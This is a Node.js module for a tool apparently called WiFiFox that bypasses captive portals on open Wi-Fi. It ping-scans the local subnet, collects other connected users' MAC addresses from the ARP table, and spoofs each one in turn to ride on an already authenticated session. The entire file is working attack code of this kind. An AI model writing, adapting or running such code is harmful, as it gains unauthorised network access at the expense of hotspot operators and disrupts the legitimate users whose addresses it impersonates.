const defaultGateway = require('default-gateway')
const os = require('os')
const ping = require('./ping')
const arp = require('./arp')
const spoof = require('spoof')
const cidrRange = require('cidr-range')
const wifi = require('node-wifi')
const request = require('request')

const BLOCK_SIZE = 255

const isConnected = () => {
  return new Promise((resolve) => {
    request('http://www.apple.com/library/test/success.html', (err, response, body) => {
      if (err) return resolve(false)
      resolve(body === '<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>')
    })
  })
}

let isInit = false
async function init() {
  if (isInit) return
  const { interface } = await defaultGateway.v4() // TODO: v6 support
  if (!interface) return
  wifi.init({
    iface: interface
  })
  isInit = true
}

module.exports.isOnOpenNetwork = async () => {
  await init()
  const currentConnections = await new Promise((resolve, reject) => {
    wifi.getCurrentConnections(function (err, currentConnections) {
      if (err) return reject(err)
      resolve(currentConnections)
    })
  })
  if (currentConnections.length == 0) {
    return false
  }
  if (currentConnections[0].security !== 'none') { // TODO: maybe not "none" for all OS?
    return false
  }
  return true
}

function isMulticastAddress(mac) {
  return parseInt(mac.split(':')[0], 16) & 1 // 1 in LSB of first octect implies multicast
}

function isBroadcastAddress(mac) {
  return mac === 'FF:FF:FF:FF:FF:FF'
}

module.exports.connect = async () => {
  await init()
  if (await isConnected()) return // try our initial MAC

  // get default gateway, interface name
  const { gateway, interface } = await defaultGateway.v4() // TODO: v6 support
  const it = spoof.findInterface(interface)

  const currentConnections = await new Promise((resolve, reject) => {
    wifi.getCurrentConnections(function (err, currentConnections) {
      if (err) return reject(err)
      resolve(currentConnections)
    })
  })
  if (currentConnections.length == 0) {
    console.log('Not connected to any network')
    throw new Error('Not connected to any network.')
    // TODO: relay this to user in modal
  }
  console.log('Network security', currentConnections[0].security)
  if (currentConnections[0].security !== 'none') { // TODO: maybe not "none" for all OS?
    console.log(currentConnections[0].ssid, 'is not an open network.')
    throw new Error('WiFiFox only works with open networks.')
  }
  const initialSSID = currentConnections[0].ssid

  // get interface object
  const iface = os.networkInterfaces()[interface].filter(i => i.family === 'IPv4')[0]

  // get all IPs in CIDR range of gateway
  const range = cidrRange(iface.cidr, { onlyHosts: true })

  const attemptedMACs = [iface.mac]

  // ping scan a block of IPs
  let i = 0
  while (i < range.length) {
    // parse arp table for any new MACs
    const newMACs = (await arp.listMACs(gateway))
      .filter(mac => !isMulticastAddress(mac))
      .filter(mac => !isBroadcastAddress(mac))
      .filter(mac => attemptedMACs.indexOf(mac) === -1)
    for (let j = 0; j < newMACs.length; ++j) {

      // spoof MAC
      console.log('Trying MAC', newMACs[j])
      spoof.setInterfaceMAC(it.device, newMACs[j], it.port)
      attemptedMACs.push(newMACs[j])

      // force wifi reconnect
      await new Promise((resolve, reject) => {
        wifi.connect({ ssid: initialSSID }, (err) => {
          if (err) return reject(err)
          resolve()
        })
      })

      if (await isConnected()) {
        console.log('Connected with MAC', newMACs[j])
        return
      }
    }

    const block = range.slice(i, i + BLOCK_SIZE)
    console.log('Scanning next block of', BLOCK_SIZE)
    await Promise.all(block.map((ip) => {
      return ping(ip)
    }))
    i += BLOCK_SIZE
  }

  console.log('Failed to connected with any MAC')
  if (attemptedMACs.length > 1) {
    throw new Error("WiFiFox couldn't bypass the captive portal.")
  } else {
    throw new Error('No other users are on this network.')
  }
}

module.exports.reset = async () => {
  // get default gateway, interface name
  const { interface } = await defaultGateway.v4() // TODO: v6 support
  const it = spoof.findInterface(interface)

  spoof.setInterfaceMAC(it.device, it.address, it.port)
}
